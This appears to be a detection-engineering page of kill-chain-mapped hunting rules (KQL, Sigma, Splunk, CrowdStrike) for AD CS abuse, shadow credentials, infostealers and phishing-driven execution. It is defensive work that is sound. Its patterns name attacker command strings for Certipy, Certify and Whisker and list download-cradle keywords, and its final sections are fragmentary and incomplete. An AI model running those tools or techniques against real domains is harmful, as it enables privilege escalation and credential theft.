Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration. → Asset exposure — vulnerability matches article CVE(s)
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → Phishing-link click correlated to endpoint execution · Email attachment opened from external sender
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → [LLM] CVE-2022-26923 exploitation via update6.exe binary execution · [LLM] AD CS certificate request with ENROLLEE_SUPPLIES_SUBJECT flag (ESC1) · Office app spawning script/LOLBin child process · Fake CAPTCHA / clipboard-injected PowerShell (ClickFix / FakeCaptcha) · PowerShell encoded / obfuscated command · Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — Inside AD CS Escalation: Unpacking Advanced Misuse Techniques and Tools
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] AD CS attacker tooling execution: Certify, Certipy, Whisker process indicators · [LLM] Shadow Credentials: msDS-KeyCredentialLink attribute modification · Suspicious browser extension installation · RMM tool installed by non-IT user — remote-access utility for hands-on-keyboard
Command & Control. Beacon to attacker infrastructure for control and tasking.
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → [LLM] PKINIT Kerberos TGT request via certificate authentication anomaly · Infostealer — non-browser process accessing browser cookie/login DBs · Remote service execution — PsExec / SMB lateral movement · Ransomware-style mass file rename / extension change · LSASS process access / dump (credential theft)
[LLM] CVE-2022-26923 exploitation via update6.exe binary execution Exploitation High
Detects execution of the update6.exe binary observed in Rapid7-reported AD CS social-engineering campaigns exploiting CVE-2022-26923. The binary requests certificates from AD CS to escalate privileges via dNSHostName attribute manipulation. Rationale: Article explicitly names update6.exe as the dropper observed in Rapid7's August 2024 campaign exploiting CVE-2022-26923. Cross-referenced with Rapid7 advisory and Microsoft MSRC CVE-2022-26923 page describing certificate-based privilege escalation. Cross-checked against: • https://www.rapid7.com/blog/post/2024/08/ • https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923 • https://attack.mitre.org/techniques/T1649/
ATT&CKT1068 T1649
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName =~ "update6.exe" or ProcessCommandLine has "update6.exe"
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName endswith "\\update6.exe" or CommandLine has "update6.exe"
| where AccountName !endswith "$"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
title: Suspicious update6.exe Execution (CVE-2022-26923)
id: 7c2b3a4d-1e5f-4a6b-9c8d-0e1f2a3b4c5d
description: Detects execution of update6.exe binary used in known CVE-2022-26923 exploitation campaigns against AD CS
references:
  - https://unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/
  - https://www.rapid7.com/blog/post/2024/08/
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.t1068
  - attack.t1649
  - attack.privilege_escalation
logsource:
  category: process_creation
  product: windows
detection:
  selection:
    Image|endswith: '\update6.exe'
  condition: selection
level: high
source:(windows.security OR windows.sysmon) (@Image:(*\\update6.exe OR *\\Update6.exe OR *\\UPDATE6.EXE) OR @CommandLine:*update6.exe*) -@User:*$
#event_simpleName=ProcessRollup2
| ImageFileName=/\\update6\.exe$/i OR CommandLine=/update6\.exe/i
| NOT UserName=/\$$/
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine, SHA256HashData], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name="update6.exe" OR Processes.process=*update6.exe*) by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name Processes.process_hash | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name="update6.exe" OR Processes.process=*update6.exe*) by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name Processes.process_hash | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
[LLM] AD CS attacker tooling execution: Certify, Certipy, Whisker process indicators Installation High
Detects execution of public AD CS exploitation tools (Certify.exe, certipy, Whisker.exe, pyWhisker) named in the article as the standard attacker toolkit for certificate template abuse and shadow-credential attacks. Rationale: Article's Table 2 explicitly enumerates Certify, Certipy, Whisker, and pyWhisker as the attacker toolkit. CLI strings 'find -vulnerable', 'shadow auto', 'req -ca' are documented command syntax in the public GitHub repos for these tools. Cross-referenced with MITRE ATT&CK T1649 and the public Certipy/Certify GitHub project docs. Cross-checked against: • https://github.com/ly4k/Certipy • https://github.com/GhostPack/Certify • https://github.com/eladshamir/Whisker • https://attack.mitre.org/techniques/T1649/
ATT&CKT1649 T1098
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ ("Certify.exe","certipy.exe","Whisker.exe","pywhisker.exe","certipy-ad.exe")
   or ProcessCommandLine has_any ("certipy ","Certify.exe ","pywhisker ","Whisker.exe ","find -vulnerable","req -ca ","req /ca:","shadow auto","shadow add","shadow list","-template ","/template:","-asreproast","-kerberoast")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, FolderPath, ProcessCommandLine, SHA256, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessParentFileName
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where NewProcessName has_any ("\\Certify.exe","\\certipy.exe","\\Whisker.exe","\\pywhisker.exe","\\certipy-ad.exe")
   or CommandLine has_any ("certipy ","Certify.exe ","pywhisker ","Whisker.exe ","find -vulnerable","req -ca ","req /ca:","shadow auto","shadow add","shadow list")
| where AccountName !endswith "$"
| project TimeGenerated, Computer, Account, NewProcessName, CommandLine, ParentProcessName
title: AD CS Exploitation Tooling Execution (Certify/Certipy/Whisker)
id: 8d3c4b5e-2f6a-4b7c-ad9e-1f2a3b4c5d6e
description: Detects execution of known AD CS exploitation tooling named in Unit 42 Inside AD CS Escalation research
references:
  - https://unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/
  - https://github.com/ly4k/Certipy
  - https://github.com/GhostPack/Certify
  - https://github.com/eladshamir/Whisker
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.t1649
  - attack.t1098
  - attack.credential_access
logsource:
  category: process_creation
  product: windows
detection:
  selection_image:
    Image|endswith:
      - '\Certify.exe'
      - '\certipy.exe'
      - '\certipy-ad.exe'
      - '\Whisker.exe'
      - '\pywhisker.exe'
  selection_cmdline:
    CommandLine|contains:
      - 'find -vulnerable'
      - 'req -ca '
      - 'req /ca:'
      - 'shadow auto'
      - 'shadow add'
      - 'shadow list'
  condition: selection_image or selection_cmdline
level: high
source:(windows.security OR windows.sysmon) (@Image:(*\\Certify.exe OR *\\certify.exe OR *\\CERTIFY.EXE OR *\\certipy.exe OR *\\Certipy.exe OR *\\certipy-ad.exe OR *\\Whisker.exe OR *\\whisker.exe OR *\\pywhisker.exe) OR @CommandLine:(*"find -vulnerable"* OR *"shadow auto"* OR *"shadow add"* OR *"req -ca "* OR *"req /ca:"*)) -@User:*$
#event_simpleName=ProcessRollup2
| (ImageFileName=/\\(certify|certipy|certipy-ad|whisker|pywhisker)\.exe$/i OR CommandLine=/find\s+-vulnerable|shadow\s+(auto|add|list)|req\s+(-ca\s+|\/ca:)/i)
| NOT UserName=/\$$/
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name IN ("Certify.exe","certipy.exe","Whisker.exe","pywhisker.exe") OR Processes.process=*certipy* OR Processes.process=*Certify* OR Processes.process=*pywhisker* OR Processes.process=*Whisker* OR Processes.process=*"find -vulnerable"* OR Processes.process=*"req /ca:"* OR Processes.process=*"shadow auto"* OR Processes.process=*"shadow add"*) by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process_name IN ("Certify.exe","certipy.exe","Whisker.exe","pywhisker.exe") OR Processes.process=*certipy* OR Processes.process=*Certify* OR Processes.process=*pywhisker* OR Processes.process=*Whisker* OR Processes.process=*"find -vulnerable"* OR Processes.process=*"req /ca:"* OR Processes.process=*"shadow auto"* OR Processes.process=*"shadow add"*) by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name | `drop_dm_object_name(Processes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
[LLM] Shadow Credentials: msDS-KeyCredentialLink attribute modification Installation High
Detects modification of the msDS-KeyCredentialLink LDAP attribute, the core persistence technique used by Whisker/pyWhisker to attach an attacker-controlled key to a target account for PKINIT-based authentication. This is the canonical shadow-credentials persistence signal. Rationale: Article's Table 2 names Whisker (C#) and pyWhisker (Python) specifically as tools that 'manipulate the msDS-KeyCredentialLink attribute.' This attribute change on a privileged account is the canonical shadow-credentials persistence signal — corroborated with SpecterOps's seminal write-up on Key Trust abuse and the Whisker GitHub repository. Cross-checked against: • https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec • https://github.com/eladshamir/Whisker • https://attack.mitre.org/techniques/T1098/001/
ATT&CKT1098.001 T1556
Data sourcesChange.Account_Management
IdentityQueryEvents
| where Timestamp > ago(30d)
| where Query has "msDS-KeyCredentialLink" or QueryTarget has "msDS-KeyCredentialLink"
| where AccountName !endswith "$"
| project Timestamp, AccountName, AccountDomain, AccountUpn, DeviceName, IPAddress, Query, QueryTarget, QueryType, Protocol, Application
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 5136
| where EventData has "msDS-KeyCredentialLink"
| extend AttrLDAPName = tostring(extract(@"<Data Name=\"AttributeLDAPDisplayName\">([^<]+)<", 1, EventData))
| extend ObjDN = tostring(extract(@"<Data Name=\"ObjectDN\">([^<]+)<", 1, EventData))
| extend OpType = tostring(extract(@"<Data Name=\"OperationType\">([^<]+)<", 1, EventData))
| where AttrLDAPName == "msDS-KeyCredentialLink"
| where SubjectUserName !endswith "$"
| project TimeGenerated, Computer, SubjectUserName, SubjectDomainName, ObjDN, AttrLDAPName, OpType, EventData
title: Shadow Credentials msDS-KeyCredentialLink Modification
id: 9e4d5c6f-3a7b-4c8d-be0f-2a3b4c5d6e7f
description: Detects modification of the msDS-KeyCredentialLink attribute used by Whisker/pyWhisker to inject shadow credentials onto an AD account
references:
  - https://unit42.paloaltonetworks.com/active-directory-certificate-services-exploitation/
  - https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ec
  - https://github.com/eladshamir/Whisker
author: SOC Detection Engineering
date: 2026/05/20
tags:
  - attack.t1098.001
  - attack.t1556
  - attack.persistence
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 5136
    AttributeLDAPDisplayName: 'msDS-KeyCredentialLink'
  filter_machine:
    SubjectUserName|endswith: '$'
  condition: selection and not filter_machine
level: high
source:windows.security @EventID:5136 (@EventData:*msDS-KeyCredentialLink* OR @AttributeLDAPDisplayName:msDS-KeyCredentialLink) -@SubjectUserName:*$
#event_simpleName=IdpDirectoryServicesChange OR (#event_simpleName=ActiveDirectoryObjectOperation)
| (AttributeName=/msDS-KeyCredentialLink/i OR FieldName=/msDS-KeyCredentialLink/i OR RawEventData=/msDS-KeyCredentialLink/i)
| NOT UserName=/\$$/
| groupBy([aid, ComputerName, UserName, TargetObjectDN], function=count())
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Change.All_Changes where All_Changes.action=modified All_Changes.object_attrs=*msDS-KeyCredentialLink* by All_Changes.dest All_Changes.user All_Changes.object All_Changes.object_attrs All_Changes.src | `drop_dm_object_name(All_Changes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Change.All_Changes where All_Changes.action=modified All_Changes.object_attrs=*msDS-KeyCredentialLink* by All_Changes.dest All_Changes.user All_Changes.object All_Changes.object_attrs All_Changes.src | `drop_dm_object_name(All_Changes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
[LLM] PKINIT Kerberos TGT request via certificate authentication anomaly Actions on Objectives Medium
Detects Kerberos pre-authentication (EID 4768) using PKINIT/certificate where the certificate subject does not match the requesting account — the core behavioural signal of CVE-2022-26923 exploitation and certificate-based account impersonation highlighted in the Unit 42 article. Rationale: Article's Phase 4 explicitly calls out 'Using certificates or keys with public key cryptography for initial authentication (PKINIT) to request Kerberos tickets and impersonate privileged users.' EID 4768 with CertSerialNumber/CertIssuerName/CertThumbprint populated (parsed from EventData XML) is the on-the-wire signature of PKINIT auth — Microsoft documents these fields as part of the 4768 audit event. Cross-referenced with Microsoft MSRC CVE-2022-26923 and MITRE T1649. Cross-checked against: • https://msrc.microsoft.com/update-guide/vulnerability/CVE-2022-26923 • https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4768 • https://attack.mitre.org/techniques/T1649/
ATT&CKT1558.003 T1649 T1550
Data sourcesAuthentication.Authentication
IdentityLogonEvents
| where Timestamp > ago(30d)
| where Protocol == "Kerberos"
| where ActionType == "LogonSuccess"
| where AdditionalFields has_any ("PKINIT","Certificate","SmartCard")
| where AccountName !endswith "$"
| summarize Count = count(), Devices = make_set(DeviceName), IPs = make_set(IPAddress) by AccountName, AccountDomain, bin(Timestamp, 1h)
| where Count > 0
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4768
| extend CertIssuerName = tostring(extract(@"<Data Name=\"CertIssuerName\">([^<]+)<", 1, EventData))
| extend CertSerialNumber = tostring(extract(@"<Data Name=\"CertSerialNumber\">([^<]+)<", 1, EventData))
| extend CertThumbprint = tostring(extract(@"<Data Name=\"CertThumbprint\">([^<]+)<", 1, EventData))
| where isnotempty(CertSerialNumber) or isnotempty(CertThumbprint)
| where TargetUserName !endswith "$"
| summarize TGTCount = count(), Issuers = make_set(CertIssuerName), Serials = make_set(CertSerialNumber), SourceIPs = make_set(IpAddress) by TargetUserName, TargetDomainName, bin(TimeGenerated, 1h)
| order by TimeGenerated desc
source:windows.security @EventID:4768 (@EventData:*CertSerialNumber* OR @EventData:*CertIssuerName* OR @EventData:*PKINIT*) -@TargetUserName:*$
#event_simpleName=UserLogon
| AuthenticationPackage=/Kerberos/i
| LogonType=2 OR LogonType=3 OR LogonType=10
| (RawEventData=/PKINIT/i OR RawEventData=/CertSerialNumber/i OR RawEventData=/SmartCard/i)
| NOT UserName=/\$$/
| groupBy([aid, ComputerName, UserName, RemoteAddressIP4], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Authentication.Authentication where Authentication.signature_id=4768 Authentication.authentication_method=*PKINIT* by Authentication.dest Authentication.user Authentication.src Authentication.signature Authentication.authentication_method | `drop_dm_object_name(Authentication)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Authentication.Authentication where Authentication.signature_id=4768 Authentication.authentication_method=*PKINIT* by Authentication.dest Authentication.user Authentication.src Authentication.signature Authentication.authentication_method | `drop_dm_object_name(Authentication)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
[LLM] AD CS certificate request with ENROLLEE_SUPPLIES_SUBJECT flag (ESC1) Exploitation Medium
Detects ESC1-style certificate requests where the requester supplies an arbitrary subject in the Certificate Signing Request — the exact misconfiguration the article describes attackers abusing to mint authentication certificates for high-privilege accounts they don't control. Rationale: Article explicitly calls out the ENROLLEE_SUPPLIES_SUBJECT template flag ('Supply in the request' option) as the key misconfiguration enabling ESC1. EIDs 4886/4887/4888 on AD CS servers carry the Requester and the Attributes blob (parsed from EventData XML) which includes the requested SubjectAltName UPN — a mismatch between Requester and SAN UPN is the textbook ESC1 signal documented by SpecterOps's Certified Pre-Owned research. Cross-checked against: • https://posts.specterops.io/certified-pre-owned-d95910965cd2 • https://learn.microsoft.com/en-us/windows-server/identity/ad-fs/troubleshooting/ad-fs-tshoot-logging • https://attack.mitre.org/techniques/T1649/
ATT&CKT1649 T1078.002
Data sourcesChange.All_Changes
DeviceEvents
| where Timestamp > ago(30d)
| where ActionType in ("CertificateRequest","CertificateIssued")
   or AdditionalFields has_any ("ENROLLEE_SUPPLIES_SUBJECT","CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, AccountDomain, ActionType, AdditionalFields, InitiatingProcessFileName, InitiatingProcessCommandLine
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID in (4886, 4887, 4888)
| extend Requester = tostring(extract(@"<Data Name=\"Requester\">([^<]+)<", 1, EventData))
| extend Attributes = tostring(extract(@"<Data Name=\"Attributes\">([^<]+)<", 1, EventData))
| extend TemplateName = tostring(extract(@"<Data Name=\"TemplateName\">([^<]+)<", 1, EventData))
| extend SubjectAltName = tostring(extract(@"san:[^<]*upn=([^&<]+)", 1, Attributes))
| where isnotempty(SubjectAltName) and isnotempty(Requester)
| extend RequesterUser = tolower(tostring(split(Requester, "\\")[1]))
| extend SANUser = tolower(tostring(split(SubjectAltName, "@")[0]))
| where RequesterUser != SANUser
| where Requester !endswith "$"
| project TimeGenerated, Computer, Requester, RequesterUser, SubjectAltName, SANUser, TemplateName, Attributes, EventData
| order by TimeGenerated desc
source:windows.security (@EventID:4886 OR @EventID:4887 OR @EventID:4888) (@EventData:*upn=* OR @EventData:*CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT* OR @Attributes:*SubjectAltName*) -@SubjectUserName:*$
#event_simpleName=ProcessRollup2
| (CommandLine=/certreq\.exe.*-attrib/i OR CommandLine=/certipy.*req/i OR CommandLine=/Certify\.exe\s+request/i OR CommandLine=/upn=.*@/i)
| ParentBaseFileName!=/services\.exe/i
| NOT UserName=/\$$/
| groupBy([aid, ComputerName, UserName, CommandLine], function=count())
APPLICATION
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime from datamodel=Change.All_Changes where (All_Changes.signature_id=4886 OR All_Changes.signature_id=4887) by All_Changes.dest All_Changes.user All_Changes.object All_Changes.object_attrs All_Changes.action | `drop_dm_object_name(All_Changes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Change.All_Changes where (All_Changes.signature_id=4886 OR All_Changes.signature_id=4887) by All_Changes.dest All_Changes.user All_Changes.object All_Changes.object_attrs All_Changes.action | `drop_dm_object_name(All_Changes)` | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
Suspicious browser extension installation Installation Medium
Side-loaded / unsigned extensions, often masquerading as wallets, productivity tools.
ATT&CKT1176
Data sourcesEndpoint.Registry DeviceRegistryEvents
DeviceRegistryEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where RegistryKey has_any ("\Software\Google\Chrome\Extensions\","\Software\Microsoft\Edge\Extensions\","\Software\Mozilla\Firefox\Extensions\")
| project Timestamp, DeviceName, RegistryKey, RegistryValueName, RegistryValueData,
          InitiatingProcessFileName, InitiatingProcessAccountName
ImRegistryEvent
| where TimeGenerated > ago(7d)
| where ActorUsername !endswith "$"
| where RegistryKey has_any (@"\Software\Google\Chrome\Extensions\",
                              @"\Software\Microsoft\Edge\Extensions\",
                              @"\Software\Mozilla\Firefox\Extensions\")
| project TimeGenerated, DvcHostname, ActorUsername, RegistryKey,
          RegistryValue, RegistryValueData, ActingProcessName
| order by TimeGenerated desc

title: Browser Extension Installation via Registry
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0a
status: experimental
description: |
    Registry writes under the browser extension policy keys —
    administrative install of an extension. Often used by adware /
    info-stealers to bypass user-level extension controls.
references:
    - https://attack.mitre.org/techniques/T1176/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1176
    - attack.persistence
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\Software\Google\Chrome\Extensions\'
            - '\Software\Microsoft\Edge\Extensions\'
            - '\Software\Mozilla\Firefox\Extensions\'
    condition: selection
falsepositives:
    - Group-policy-managed extension whitelists
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Registry
    where (Registry.registry_path="*\Software\Google\Chrome\Extensions\*"
        OR Registry.registry_path="*\Software\Microsoft\Edge\Extensions\*"
        OR Registry.registry_path="*\Software\Mozilla\Firefox\Extensions\*")
    by Registry.dest, Registry.registry_path, Registry.registry_value_data, Registry.registry_value_name, Registry.user
| `drop_dm_object_name(Registry)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Registry
    where (Registry.registry_path="*\Software\Google\Chrome\Extensions\*"
        OR Registry.registry_path="*\Software\Microsoft\Edge\Extensions\*"
        OR Registry.registry_path="*\Software\Mozilla\Firefox\Extensions\*")
    by Registry.dest, Registry.registry_path, Registry.registry_value_data, Registry.registry_value_name, Registry.user
| `drop_dm_object_name(Registry)`
Infostealer — non-browser process accessing browser cookie/login DBs Actions on Objectives High
Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies SQLite from Chrome/Edge/Firefox.
ATT&CKT1539 T1555.003
Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"
| where FolderPath has_any (@"\Google\Chrome\User Data\", @"\Microsoft\Edge\User Data\", @"\Mozilla\Firefox\Profiles\")

| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01

description: |

references:
    - https://attack.mitre.org/techniques/T1539/

Phishing-link click correlated to endpoint execution Delivery High
User received an external email containing a URL, clicked it, and within 60 seconds the recipient's endpoint spawned a scripting interpreter or network downloader (PowerShell / cmd / mshta / curl / certutil / bitsadmin). This is the high-fidelity shape — a raw "user clicked an emailed URL" query is too noisy to alert on because every Microsoft 365 tenant generates thousands of legitimate clicks per day. The exec-correlation step suppresses the noise to roughly the rate at which a click actually drives onto-host execution, which is the actionable signal. Pair with UC_PHISH_LINK_BYPASS (Safe Links override) and UC_PHISH_LINK_NEWDOMAIN for orthogonal high-fidelity variants.
ATT&CKT1566.002 T1204.001 T1059.001
Data sourcesEmail.All_Email Web Endpoint.Processes EmailEvents EmailUrlInfo UrlClickEvents DeviceProcessEvents
// Phishing-link click that drives endpoint execution within 60s.
// Far higher fidelity than "every clicked URL" — most legitimate clicks
// never spawn a non-browser child process, so the join eliminates the
// 99% of noise that makes a raw click query unactionable.
let LookbackDays = 7d;
let SuspectClicks = UrlClickEvents
    | where Timestamp > ago(LookbackDays)
    | where AccountName !endswith "$"
    | where ActionType in ("ClickAllowed","ClickedThrough")
    | join kind=inner (
        EmailEvents
        | where Timestamp > ago(LookbackDays)
        | where DeliveryAction == "Delivered"
        | where EmailDirection == "Inbound"
        | project NetworkMessageId, Subject, SenderFromAddress, SenderFromDomain,
                  RecipientEmailAddress, EmailTimestamp = Timestamp
      ) on NetworkMessageId
    | join kind=leftouter (
        EmailUrlInfo | project NetworkMessageId, Url, UrlDomain
      ) on NetworkMessageId, Url
    | project ClickTime = Timestamp, AccountUpn, IPAddress, Url, UrlDomain,
              Subject, SenderFromAddress, SenderFromDomain, RecipientEmailAddress,
              ActionType;
// Correlate to a non-browser child process spawned within 60 seconds on
// the recipient's device.
DeviceProcessEvents
| where Timestamp > ago(LookbackDays)
| where InitiatingProcessFileName in~ ("chrome.exe","msedge.exe","firefox.exe",
                                         "outlook.exe","brave.exe","arc.exe")
| where FileName in~ ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                        "rundll32.exe","regsvr32.exe","wscript.exe","cscript.exe",
                        "bitsadmin.exe","certutil.exe","curl.exe","wget.exe")
| join kind=inner SuspectClicks on $left.AccountName == $right.AccountUpn
| where Timestamp between (ClickTime .. ClickTime + 60s)
| project ClickTime, ProcessTime = Timestamp,
          DelaySec = datetime_diff('second', Timestamp, ClickTime),
          DeviceName, AccountName, RecipientEmailAddress, SenderFromAddress,
          Subject, Url, UrlDomain, ActionType,
          FileName, ProcessCommandLine, InitiatingProcessFileName
| order by ClickTime desc
// UrlClickEvents has no clean Sentinel-native equivalent. The detection
// pivots to: Office Send→Receive proximity to SecurityEvent 4688 of a
// non-browser child process. Lower fidelity than the Defender version.
let LookbackDays = 7d;
let SuspectMailUsers = OfficeActivity
    | where TimeGenerated > ago(LookbackDays)
    | where OfficeWorkload == "Exchange"
    | where Operation =~ "Receive"
    | summarize Subject = any(Subject), Sender = any(Sender)
                by MailboxOwnerUPN, MessageId, EmailTime = bin(TimeGenerated, 1m);
SecurityEvent
| where TimeGenerated > ago(LookbackDays)
| where EventID == 4688
| where ParentProcessName has_any ("\chrome.exe","\msedge.exe",
                                     "\firefox.exe","\outlook.exe","\brave.exe")
| where NewProcessName has_any ("\powershell.exe","\pwsh.exe","\cmd.exe",
                                  "\mshta.exe","\rundll32.exe","\regsvr32.exe",
                                  "\wscript.exe","\cscript.exe","\bitsadmin.exe",
                                  "\certutil.exe","\curl.exe","\wget.exe")
| join kind=inner SuspectMailUsers on $left.Account == $right.MailboxOwnerUPN
| where TimeGenerated between (EmailTime .. EmailTime + 60s)
| project TimeGenerated, EmailTime, Computer, Account, ParentProcessName,
          NewProcessName, CommandLine, Sender, Subject
| order by TimeGenerated desc
WEB
Toggle if your env has no CIM data-model acceleration.
``` Phishing-link click that drives endpoint execution within 60s ```
| tstats `summariesonly` earliest(_time) AS click_time
    from datamodel=Web
    where Web.action="allowed"
    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats `summariesonly` count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats `summariesonly` earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

    from datamodel=Web

    by Web.src, Web.user, Web.dest, Web.url
| `drop_dm_object_name(Web)`
| rename user AS recipient, dest AS clicked_domain, url AS clicked_url
| join type=inner recipient
    [| tstats summariesonly=false count
         from datamodel=Email.All_Email
         where All_Email.action="delivered" AND All_Email.url!="-"
         by All_Email.recipient, All_Email.src_user, All_Email.url, All_Email.subject
     | `drop_dm_object_name(All_Email)`
     | rex field=url "https?://(?<email_domain>[^/]+)"
     | rename recipient AS recipient]
| join type=inner src
    [| tstats summariesonly=false earliest(_time) AS exec_time
         values(Processes.process) AS exec_cmd, values(Processes.process_name) AS exec_proc
         from datamodel=Endpoint.Processes
         where Processes.parent_process_name IN ("chrome.exe","msedge.exe","firefox.exe",
                                                   "outlook.exe","brave.exe","arc.exe")
           AND Processes.process_name IN ("powershell.exe","pwsh.exe","cmd.exe","mshta.exe",
                                            "rundll32.exe","regsvr32.exe","wscript.exe",
                                            "cscript.exe","bitsadmin.exe","certutil.exe",
                                            "curl.exe","wget.exe")
         by Processes.dest, Processes.user
     | `drop_dm_object_name(Processes)`
     | rename dest AS src]
| eval delta_sec = exec_time - click_time
| where delta_sec >= 0 AND delta_sec <= 60
| table click_time, exec_time, delta_sec, recipient, src, src_user, subject,
        clicked_domain, clicked_url, exec_proc, exec_cmd
| sort - click_time

| where FileName in~ ("powershell.exe","pwsh.exe","mshta.exe")
| where ProcessCommandLine matches regex @"(?i)(iex|invoke-expression|frombase64|downloadstring|hxxp|curl |wget )"

SecurityEvent
| where TimeGenerated > ago(7d)
| where EventID == 4688
| where Account !endswith "$"

   or ParentProcessName endswith "\RuntimeBroker.exe"
| where NewProcessName endswith "\powershell.exe"
